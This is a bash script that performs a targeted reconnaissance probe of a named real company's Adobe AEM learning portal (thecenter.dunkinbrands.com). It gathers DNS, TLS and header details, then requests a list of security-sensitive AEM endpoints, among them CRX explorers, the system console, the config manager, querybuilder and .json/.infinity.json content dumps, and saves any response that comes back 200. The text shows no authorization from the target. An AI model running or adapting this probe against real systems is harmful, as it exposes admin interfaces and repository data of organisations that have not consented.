#!/bin/bash
# The Center deep probe: AEM learning portal on CloudFront
# Run: podman run --rm --dns 8.8.8.8 \
#   -v ./investigations/dunkin/scripts:/work/scripts:z \
#   -v ./investigations/dunkin/artifacts/thecenter-deep-2026-04-13:/out:Z \
#   investigator bash /work/scripts/33-thecenter-deep.sh
set -uo pipefail

OUTDIR="/out"
mkdir -p "$OUTDIR"
TARGET="thecenter.dunkinbrands.com"

echo "=== THE CENTER LEARNING PORTAL DEEP PROBE ===" | tee "$OUTDIR/results.txt"
echo "Target: $TARGET" | tee -a "$OUTDIR/results.txt"
echo "Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "$OUTDIR/results.txt"
echo "" | tee -a "$OUTDIR/results.txt"

# === DNS ===
echo "--- DNS ---" | tee -a "$OUTDIR/results.txt"
dig +short "$TARGET" CNAME @8.8.8.8 2>/dev/null | tee -a "$OUTDIR/results.txt"
dig +short "$TARGET" A @8.8.8.8 2>/dev/null | tee -a "$OUTDIR/results.txt"

# === TLS CERT ===
echo "" | tee -a "$OUTDIR/results.txt"
echo "--- TLS Certificate ---" | tee -a "$OUTDIR/results.txt"
timeout 10 openssl s_client -connect "$TARGET:443" -servername "$TARGET" </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer -dates -ext subjectAltName 2>/dev/null | tee -a "$OUTDIR/results.txt" || echo "TLS FAILED" | tee -a "$OUTDIR/results.txt"

# === ROOT PROBE ===
echo "" | tee -a "$OUTDIR/results.txt"
echo "--- Root Probe ---" | tee -a "$OUTDIR/results.txt"
curl -sk --max-time 10 -D "$OUTDIR/root.headers" "https://$TARGET/" > "$OUTDIR/root.body" 2>/dev/null || true
root_status=$(head -1 "$OUTDIR/root.headers" 2>/dev/null || echo "FAILED")
echo "  Status: $root_status" | tee -a "$OUTDIR/results.txt"
echo "  Headers:" | tee -a "$OUTDIR/results.txt"
cat "$OUTDIR/root.headers" 2>/dev/null | tee -a "$OUTDIR/results.txt"

# === WAYBACK-DISCOVERED PATHS ===
echo "" | tee -a "$OUTDIR/results.txt"
echo "--- AEM Content Paths (from Wayback) ---" | tee -a "$OUTDIR/results.txt"
AEM_PATHS=(
  "/content/combo/us/en/home.html"
  "/content/combo/us/en/header/learning-path-combo.html"
  "/content/combo/us/en/header/learning-path-combo/dunkin-learning-path-11-27.html"
  "/content/combo/us/en/header/readiness/spring-readiness-february-21-april-30.html"
  "/content/dam/public-facing-documents/Background_Login.png"
  "/content/dam/public-facing-documents/okta-login-screen.css"
  "/content/dam/public-facing-documents/TheCenter_Logo_090622.png"
  "/content/dam/public-facing-documents/favicon.ico"
  "/content/combo/us/en/home/dunkin-equipment/bakery-equipment.html"
  "/system/sling/logout.html"
  "/libs/granite/core/content/login.html"
)

for path in "${AEM_PATHS[@]}"; do
  result=$(curl -sk --max-time 10 -o /dev/null -w '%{http_code} %{size_download} %{content_type}' "https://$TARGET$path" 2>/dev/null)
  status=$(echo "$result" | awk '{print $1}')
  size=$(echo "$result" | awk '{print $2}')
  ctype=$(echo "$result" | awk '{print $3}')
  echo "  $path → $status (${size}B) [$ctype]" | tee -a "$OUTDIR/results.txt"

  if [ "$status" = "200" ]; then
    safename=$(echo "$path" | tr '/.:-' '_' | sed 's/^_//')
    curl -sk --max-time 15 "https://$TARGET$path" > "$OUTDIR/${safename}" 2>/dev/null || true
  fi
done

# === AEM SECURITY-SENSITIVE PATHS ===
echo "" | tee -a "$OUTDIR/results.txt"
echo "--- AEM Security Paths ---" | tee -a "$OUTDIR/results.txt"
AEM_SECURITY_PATHS=(
  "/crx/de"
  "/crx/de/index.jsp"
  "/crx/explorer/browser/index.jsp"
  "/libs/granite/security/currentuser.json"
  "/system/console/bundles"
  "/system/console/configMgr"
  "/system/console/status-Configurations.txt"
  "/bin/querybuilder.json"
  "/bin/wcm/search/gql.json"
  "/.json"
  "/content.json"
  "/etc.json"
  "/apps.json"
  "/var.json"
  "/system/console"
  "/_jcr_content.json"
  "/content/combo.infinity.json"
)

for path in "${AEM_SECURITY_PATHS[@]}"; do
  result=$(curl -sk --max-time 8 -o /dev/null -w '%{http_code} %{size_download}' "https://$TARGET$path" 2>/dev/null)
  status=$(echo "$result" | awk '{print $1}')
  size=$(echo "$result" | awk '{print $2}')
  if [ "$status" != "000" ]; then
    echo "  $path → $status (${size}B)" | tee -a "$OUTDIR/results.txt"
    if [ "$status" = "200" ] && [ "$size" -gt 0 ]; then
      safename=$(echo "$path" | tr '/.:-' '_' | sed 's/^_//')
      echo "  ** CAPTURING → $safename **" | tee -a "$OUTDIR/results.txt"
      curl -sk --max-time 10 "https://$TARGET$path" > "$OUTDIR/${safename}" 2>/dev/null || true
    fi
  fi
done

# === WAYBACK FOR THE CENTER ===
echo "" | tee -a "$OUTDIR/results.txt"
echo "--- Wayback Machine ---" | tee -a "$OUTDIR/results.txt"
http_code=$(curl -s --max-time 30 -o "$OUTDIR/wb-thecenter.json" -w '%{http_code}' \
  "https://web.archive.org/cdx/search/cdx?url=thecenter.dunkinbrands.com/*&output=json&limit=30&collapse=urlkey&fl=timestamp,original,statuscode,mimetype" 2>/dev/null)
echo "  HTTP: $http_code" | tee -a "$OUTDIR/results.txt"
if [ "$http_code" = "200" ] && [ -s "$OUTDIR/wb-thecenter.json" ]; then
  jq -r '.[] | "\(.[0]) \(.[2]) \(.[3]) \(.[1])"' "$OUTDIR/wb-thecenter.json" 2>/dev/null | head -30 | tee -a "$OUTDIR/results.txt" || true
fi

echo "" | tee -a "$OUTDIR/results.txt"
echo "=== DONE ===" | tee -a "$OUTDIR/results.txt"
echo "Completed: $(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "$OUTDIR/results.txt"
